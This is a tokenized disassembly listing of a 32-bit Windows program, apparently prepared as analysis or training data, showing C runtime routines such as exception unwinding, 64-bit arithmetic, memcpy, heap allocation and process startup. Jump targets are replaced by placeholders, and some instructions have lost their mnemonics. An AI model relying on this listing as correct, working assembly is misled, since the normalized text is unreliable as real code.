mov eax [ ebp - 0x34 ]
pop ebx
leave
retn
sub_4b5f70
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4b5fb2
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_4b5f90
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4b6046
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_4b606f
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov [ esi ] r--data
push [ edi ]
call sub_4b6ec0
inc eax
push eax
call sub_4b66db
test eax eax
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
pop edi
mov [ esi + 0x8 ] 0x1
mov eax esi
pop esi
retn 0x4
push [ edi ]
push eax
call sub_4b7eb0
pop ecx
pop ecx
sub_4b60ac
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov [ esi ] r--data
mov eax [ edi + 0x8 ]
test eax eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
call sub_4b6ec0
inc eax
push eax
call sub_4b66db
test eax eax
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
push [ edi + 0x4 ]
push eax
call sub_4b7eb0
pop ecx
pop ecx
jmp r-xdata
sub_4b6135
push esi
mov esi ecx
push 0xe
mov [ esi ] r--data
call sub_4b80da
mov esi [ esi + 0x4 ]
test esi esi
pop ecx
je r-xdata
push 0xe
call sub_4b8046
pop ecx
pop esi
retn
push esi
call sub_4b66ed
pop ecx
sub_4b6180
cmp eax 0x1000
jae r-xdata
push ecx
lea ecx [ esp + 0x8 ]
neg eax
add eax esp
add eax 0x4
test [ eax ] eax
xchg esp eax
mov eax [ eax ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub_4b61c0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_4b62ba
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
call sub_4b7c13
mov esi eax
test esi esi
jne r-xdata
call eax
push esi
call sub_4b7c84
pop ecx
push [ esp + 0x8 ]
call [ ExitThread@IAT ]
push 0x10
call sub_4b6c7f
pop ecx
sub_4b638f
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
test edi edi
jne r-xdata
push esi
push 0x88
push 0x1
call sub_4b6bc4
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
call sub_4b8990
mov [ eax ] 0x16
xor eax eax
jmp r-xdata
push esi
call sub_4b66ed
test ebx ebx
pop ecx
je r-xdata
push esi
call sub_4b7c00
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x50 ] eax
mov eax [ ebp + 0x1c ]
test eax eax
pop ecx
mov [ esi + 0x4c ] edi
jne r-xdata
pop edi
pop ebx
pop ebp
retn
xor eax eax
push ebx
call sub_4b89a2
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov ebx eax
sub_4b6420
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_4b6490
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_4b64c4
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_4b6539
push esi
push [ rw-data ]
call sub_4b8bc2
pop ecx
mov ecx [ rw-data ]
mov esi eax
mov eax [ rw-data ]
mov edx ecx
sub edx eax
add edx 0x4
cmp esi edx
jae r-xdata
mov [ ecx ] edi
add [ rw-data ] 0x4
mov eax edi
pop esi
retn
mov ecx 0x800
cmp esi ecx
jae r-xdata
add ecx esi
push ecx
push eax
call sub_4b8a15
test eax eax
pop ecx
pop ecx
jne r-xdata
mov ecx esi
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
add esi 0x10
push esi
push [ rw-data ]
call sub_4b8a15
test eax eax
pop ecx
pop ecx
jne r-xdata
pop esi
retn
sub_4b65b9
push 0x80
call sub_4b66db
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
retn
push 0x18
pop eax
retn
sub_4b65e1
push 0xc
push r--data
call sub_4b8944
call sub_4b8656
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
call sub_4b6539
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4b6613
mov eax [ ebp - 0x1c ]
call sub_4b897f
retn
sub_4b6634
push 0xc
push r--data
call sub_4b8944
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x3
jne r-xdata
test esi esi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
cmp [ rw-data ] 0x1
je r-xdata
inc esi
push 0x4
call sub_4b80da
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4b94ca
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4b66a6
mov eax [ ebp - 0x1c ]
test eax eax
jne r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
add esi 0xf
and esi 0xfffffff0
call sub_4b897f
retn
sub_4b66af
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_4b6634
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_4b6e9a
test eax eax
pop ecx
jne r-xdata
sub_4b66ed
push 0xc
push r--data
call sub_4b8944
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4b897f
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_4b80da
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4b8ceb
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_4b6740
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_4b8d16
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
sub_4b675e
push ebp
mov ebp esp
sub esp 0x20
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
call sub_4b996d
add esp 0xc
test esi esi
mov edi eax
je r-xdata
mov eax edi
pop edi
pop esi
leave
retn
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_4b97c6
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
sub_4b67b6
push 0x14
push r--data
call sub_4b8944
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_4b897f
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_4b6814
push 0xc
push r--data
call sub_4b8944
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_4b685c
call sub_4b897f
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_4b6874
push 0x10
push r--data
call sub_4b8944
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_4b68be
call sub_4b897f
retn 0x14
mov esi [ ebp + 0x8 ]
mov ecx esi
call [ ebp + 0x14 ]
add esi [ ebp + 0xc ]
mov [ ebp + 0x8 ] esi
inc [ ebp - 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
sub_4b68d6
push ebp
mov ebp esp
sub esp 0x20
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
call sub_4b996d
add esp 0xc
test esi esi
mov edi eax
je r-xdata
mov eax edi
pop edi
pop esi
leave
retn
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_4b97c6
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
sub_4b692d
push esi
push edi
call sub_4b7c13
mov edi [ eax + 0x64 ]
cmp edi [ rw-data ]
je r-xdata
mov esi [ esp + 0xc ]
call sub_4ba305
mov edi eax
mov ecx [ edi + 0x48 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
push 0x8
push eax
push edi
call sub_4ba102
add esp 0xc
jmp r-xdata
movzx ecx [ esi ]
inc esi
cmp ecx 0x2d
mov edx ecx
je r-xdata
inc esi
jmp r-xdata
test eax eax
je r-xdata
movzx ecx [ esi ]
inc esi
cmp ecx 0x2b
jne r-xdata
cmp [ edi + 0x28 ] 0x1
movzx eax [ esi ]
jle r-xdata
or ecx 0xffffffff
cmp ecx 0x39
jg r-xdata
xor eax eax
cmp edx 0x2d
pop edi
pop esi
jne r-xdata
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 ]
movzx ecx [ esi ]
inc esi
jmp r-xdata
sub ecx 0x30
jmp r-xdata
retn
neg eax
cmp ecx 0x30
jl r-xdata
cmp ecx 0xffffffff
je r-xdata
sub_4b69f0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
sub ecx 0x2
sub_4b6a30
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_4b6ae4
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_4b5fb2
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_4b5f70
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_4b5fb2
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_4b6046
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_4b6bc4
push 0x10
push r--data
call sub_4b8944
mov esi [ ebp + 0x8 ]
imul esi [ ebp + 0xc ]
mov [ ebp - 0x1c ] esi
test esi esi
jne r-xdata
xor edi edi
mov [ ebp - 0x20 ] edi
cmp esi 0xffffffe0
ja r-xdata
inc esi
test edi edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
mov eax edi
cmp [ rw-data ] edi
je r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov ebx [ ebp - 0x1c ]
cmp ebx [ rw-data ]
ja r-xdata
push esi
call sub_4b6e9a
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
push 0x4
call sub_4b80da
pop ecx
and [ ebp - 0x4 ] edi
push ebx
call sub_4b94ca
pop ecx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4b6c6e
mov edi [ ebp - 0x20 ]
test edi edi
je r-xdata
jmp r-xdata
push [ ebp - 0x1c ]
push 0x0
push edi
call sub_4ba340
add esp 0xc
call sub_4b897f
retn
sub_4b6cc8
push 0x60
push r--data
call sub_4b8944
mov edi 0x94
mov eax edi
call sub_4b6180
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ esi ] edi
push esi
call [ GetVersionExA@IAT ]
mov ecx [ esi + 0x10 ]
mov [ rw-data ] ecx
mov eax [ esi + 0x4 ]
mov [ rw-data ] eax
mov edx [ esi + 0x8 ]
mov [ rw-data ] edx
mov esi [ esi + 0xc ]
and esi 0x7fff
mov [ rw-data ] esi
cmp ecx 0x2
je r-xdata
shl eax 0x8
add eax edx
mov [ rw-data ] eax
xor esi esi
push esi
mov edi [ GetModuleHandleA@IAT ]
call edi
cmp [ eax ] 0x5a4d
jne r-xdata
or esi 0x8000
mov [ rw-data ] esi
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
cmp [ ecx ] 0x4550
jne r-xdata
push 0x1
call sub_4b8c52
pop ecx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x18 ]
cmp eax 0x10b
je r-xdata
call sub_4b7def
test eax eax
jne r-xdata
push 0x1c
call sub_4b6ca4
cmp [ ecx + 0x74 ] 0xe
jbe r-xdata
cmp eax 0x20b
je r-xdata
call sub_4babae
mov [ ebp - 0x4 ] esi
call sub_4ba9b0
test eax eax
jge r-xdata
push 0x10
call sub_4b6ca4
xor eax eax
cmp [ ecx + 0xe8 ] esi
cmp [ ecx + 0x84 ] 0xe
jbe r-xdata
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_4ba88e
mov [ rw-data ] eax
call sub_4ba7ec
test eax eax
jge r-xdata
push 0x1b
call sub_4b6c7f
pop ecx
xor eax eax
cmp [ ecx + 0xf8 ] esi
jmp r-xdata
call sub_4ba5b9
test eax eax
jge r-xdata
push 0x8
call sub_4b6c7f
pop ecx
setne al
mov [ ebp - 0x1c ] eax
call sub_4b8668
mov [ ebp - 0x20 ] eax
cmp eax esi
je r-xdata
push 0x9
call sub_4b6c7f
pop ecx
mov [ ebp - 0x38 ] esi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_4ba550
mov [ ebp - 0x68 ] eax
test [ ebp - 0x38 ] 0x1
je r-xdata
push eax
call sub_4b6c7f
pop ecx
push 0xa
pop eax
movzx eax [ ebp - 0x34 ]
jmp r-xdata
call sub_4b87c2
jmp r-xdata
push edi
call sub_4b87a0
push eax
push [ ebp - 0x68 ]
push esi
push esi
call edi
push eax
call sub_4a3700
mov edi eax
mov [ ebp - 0x6c ] edi
cmp [ ebp - 0x1c ] esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax edi
lea esp [ ebp - 0x7c ]
call sub_4b897f
retn
sub_4b6e9a
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
xor eax eax
inc eax
retn
sub_4b6ec0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_4b6f50
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4b6fb0 ]
jmp [ ecx * 4 + jump_table_4b7030 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4b709c ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4b709c ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_4b7238 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4b713c ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4b7238 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4b709c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4b709c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4b709c ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4b7238 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4b7238 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4b7238 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4b7238 ]
sub_4b72af
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_4bac6e
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
call sub_4b7b80
pop esi
retn 0x4
sub_4b7315
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
retn
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
